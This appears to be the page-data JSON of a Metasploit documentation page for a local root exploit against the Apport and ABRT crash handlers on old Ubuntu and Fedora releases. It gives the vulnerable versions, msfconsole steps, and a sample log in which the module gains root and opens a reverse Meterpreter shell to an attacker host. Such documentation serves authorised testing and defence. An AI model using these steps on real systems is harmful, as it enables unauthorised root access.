{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/local/apport_abrt_chroot_priv_esc","result":{"data":{"moduleMetadataJson":{"id":"4cc737ac-69e0-59a1-b273-d55a501b6482","name":"Apport / ABRT chroot Privilege Escalation","fullname":"exploit/linux/local/apport_abrt_chroot_priv_esc","description":"This module attempts to gain root privileges on Linux systems by\n        invoking the default coredump handler inside a namespace (\"container\").\n\n        Apport versions 2.13 through 2.17.x before 2.17.1 on Ubuntu are\n        vulnerable, due to a feature which allows forwarding reports to\n        a container's Apport by changing the root directory before loading\n        the crash report, causing `usr/share/apport/apport` within the crashed\n        task's directory to be executed.\n\n        Similarly, Fedora is vulnerable when the kernel crash handler is\n        configured to change root directory before executing ABRT, causing\n        `usr/libexec/abrt-hook-ccpp` within the crashed task's directory to be\n        executed.\n\n        In both instances, the crash handler does not drop privileges,\n        resulting in code execution as root.\n\n        This module has been tested successfully on Apport 2.14.1 on\n        Ubuntu 14.04.1 LTS x86 and x86_64 and ABRT on Fedora 19 and 20 x86_64.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/local/apport_abrt_chroot_priv_esc","documentationSlug":"/modules/documentation/exploit/linux/local/apport_abrt_chroot_priv_esc"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>  This module attempts to gain root privileges on Ubuntu and Fedora systems by invoking the default coredump handler inside a namespace (\"container\").</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  Apport versions 2.13 through 2.17.x before 2.17.1 on Ubuntu are vulnerable, due to a feature which allows forwarding reports to a container's Apport by changing the root directory before loading the crash report, causing <code class=\"language-text\">usr/share/apport/apport</code> within the crashed task's directory to be executed.</p>\n<p>  Similarly, Fedora is vulnerable when the kernel crash handler is configured to change root directory before executing ABRT, causing <code class=\"language-text\">usr/libexec/abrt-hook-ccpp</code> within the crashed task's directory to be executed. Fedora's crash handler was reportedly configured to chroot ABRT by default between April and August 2014.</p>\n<p>  In both instances, the crash handler does not drop privileges, resulting in code execution as root.</p>\n<p>  This module has been tested successfully on:</p>\n<ul>\n<li>Apport 2.14.1 on Ubuntu 14.04.1 LTS x86 and x86_64</li>\n<li>ABRT on Fedora 19 and 20 x86_64</li>\n</ul>\n<p>  To test Fedora 20, disable SELinux, reboot, and modify <code class=\"language-text\">/proc/sys/kernel/core_pattern</code> to make use of the vulnerable <code class=\"language-text\">core_pattern</code> : <code class=\"language-text\">|/usr/sbin/chroot /proc/%P/root /usr/libexec/abrt-hook-ccpp %s %c %p %u %g %t e</code></p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start <code class=\"language-text\">msfconsole</code></li>\n<li>Get a session</li>\n<li>Do: <code class=\"language-text\">use exploit/linux/local/apport_abrt_chroot_priv_esc</code></li>\n<li>Do: <code class=\"language-text\">set SESSION [SESSION]</code></li>\n<li>Do: <code class=\"language-text\">check</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>You should get a new root session</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>SESSION</strong></p>\n<p>  Which session to use, which can be viewed with <code class=\"language-text\">sessions</code></p>\n<p>  <strong>WritableDir</strong></p>\n<p>  A writable directory file system path. (default: <code class=\"language-text\">/tmp</code>)</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/linux/local/apport_abrt_chroot_priv_esc\nmsf exploit(linux/local/apport_abrt_chroot_priv_esc) &gt; set session 1\nsession =&gt; 1\nmsf exploit(linux/local/apport_abrt_chroot_priv_esc) &gt; run\n\n[!] SESSION may not be compatible with this module.\n[*] Started reverse TCP handler on 172.16.191.244:4444 \n[*] Writing &#39;/tmp/.drY6cJZ&#39; (887316 bytes) ...\n[*] Writing &#39;/tmp/.LtJvrgjXq&#39; (207 bytes) ...\n[*] Launching exploit...\n[+] Upgraded session to root privileges (&#39;uid=0(root) gid=1000(user) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare),1000(user)&#39;)\n[*] Sending stage (857352 bytes) to 172.16.191.252\n[*] Meterpreter session 2 opened (172.16.191.244:4444 -&gt; 172.16.191.252:35552) at 2018-01-11 09:58:25 -0500\n[+] Deleted /tmp/.drY6cJZ\n[+] Deleted /tmp/.LtJvrgjXq\n\nmeterpreter &gt; getuid\nServer username: uid=0, gid=1000, euid=0, egid=1000\nmeterpreter &gt; sysinfo\nComputer     : 172.16.191.252\nOS           : Ubuntu 14.04 (Linux 3.13.0-32-generic)\nArchitecture : x64\nBuildTuple   : i486-linux-musl\nMeterpreter  : x86/linux\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"4cc737ac-69e0-59a1-b273-d55a501b6482"}}}